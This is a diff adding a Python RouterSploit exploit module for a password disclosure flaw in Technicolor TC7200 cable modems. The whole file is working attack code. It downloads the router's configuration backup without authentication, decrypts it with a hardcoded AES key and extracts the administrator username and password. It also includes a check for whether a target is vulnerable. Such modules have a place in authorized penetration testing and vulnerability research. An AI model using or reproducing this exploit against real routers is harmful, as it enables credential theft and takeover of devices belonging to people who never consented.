@@ -1,0 +1,88 @@
+import binascii
+import struct
+from Crypto.Cipher import AES
+
+from routersploit import (
+    exploits,
+    print_success,
+    print_error,
+    print_status,
+    http_request,
+    mute,
+    validators,
+)
+
+
+class Exploit(exploits.Exploit):
+    """
+    Exploit implementation for Technicolor TC7200 password disclosure vulnerability.
+    If the target is vulnerable, it allows read credentials for administration user.
+    """
+    __info__ = {
+        'name': 'Technicolor TC7200 Password Disclosure',
+        'description': 'Module exploits Technicolor TC7200 password disclosure vulnerability which allows fetching administration\'s password.',
+        'authors': [
+            'Gergely Eberhardt (@ebux25) from SEARCH-LAB Ltd. (www.search-lab.hu)',  # vulnerability discovery
+            '0BuRner',  # routersploit module
+        ],
+        'references': [
+            'https://www.exploit-db.com/exploits/40157/',
+            'http://www.search-lab.hu/advisories/secadv-20160720'
+        ],
+        'devices': [
+            'Technicolor TC7200',
+        ],
+    }
+
+    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
+    port = exploits.Option(80, 'Target Port')
+
+    def run(self):
+        if self.check():
+            print_success("Target is vulnerable")
+
+            url = "{}:{}/goform/system/GatewaySettings.bin".format(self.target, self.port)
+            response = http_request(method="GET", url=url)
+
+            if response is not None and response.status_code == 200 and "MLog" in response.text:
+                print_status("Reading GatewaySettings.bin...")
+
+                plain = self.decrypt_backup(response.text)
+                name, pwd = self.parse_backup(plain)
+
+                print_success('Exploit success! login: {}, password: {}'.format(name, pwd))
+            else:
+                print_error("Exploit failed. Could not extract config file.")
+        else:
+            print_error("Target is not vulnerable")
+
+    @staticmethod
+    def parse_backup(backup):
+        p = backup.find('MLog')
+        if p > 0:
+            p += 6
+            nh = struct.unpack('!H', backup[p:p + 2])[0]
+            name = backup[p + 2:p + 2 + nh]
+            p += 2 + nh
+            pwd = backup[p + 2:p + 2 + nh]
+            return name, pwd
+        return '', ''
+
+    @staticmethod
+    def decrypt_backup(backup):
+        key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')
+        l = (len(backup) / 16) * 16
+        cipher = AES.new(key, AES.MODE_ECB, '\x00' * 16)
+        plain = cipher.decrypt(backup[0:l])
+        return plain
+
+    @mute
+    def check(self):
+        url = "{}:{}/goform/system/GatewaySettings.bin".format(self.target, self.port)
+
+        response = http_request(method="GET", url=url)
+
+        if response is not None and response.status_code == 200 and "MLog" in response.text:
+            return True  # target is vulnerable
+
+        return False  # target is not vulnerable
